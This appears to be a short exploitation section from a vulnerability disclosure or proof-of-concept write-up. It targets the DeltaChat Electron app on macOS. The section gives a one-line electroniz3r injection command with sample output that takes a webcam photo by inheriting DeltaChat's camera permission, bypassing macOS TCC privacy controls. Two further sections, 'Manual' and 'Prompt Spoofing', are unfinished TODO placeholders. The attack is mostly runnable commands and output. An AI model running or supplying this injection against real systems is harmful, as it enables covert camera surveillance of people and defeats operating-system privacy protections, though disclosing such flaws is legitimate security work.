# Exploitation


### Automated 

>**Note:** When running this proof-of-concept, the Terminal app does not need a prompt for camera access. This is because the camera permission is granted to DeltaChat, and the injected code inherits those permissions, effectively bypassing macOS TCC restrictions.

Run the following from Terminal using [electroniz3r](https://github.com/r3ggi/electroniz3r)

```sh
electroniz3r inject /Applications/DeltaChat.app/ --predefined-script takeSelfie
```

Sample output:
```sh
/Applications/DeltaChat.app/ started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/56264727-4473-4393-b712-7e24c65a1c71
Check /tmp/selfie.jpg
```

Confirm the result by running:
```sh
open /tmp/selfie.jpg
```

<img width="1502" height="470" alt="poc-delta" src="https://github.com/user-attachments/assets/6bcc6604-8707-4924-89c8-2d8985aab39e" />

A picture is taken using the system webcam, without Terminal having any camera access this demonstrates a successful TCC bypass.

### Manual 

TODO: xxx

### Prompt Spoofing

TODO: xxx

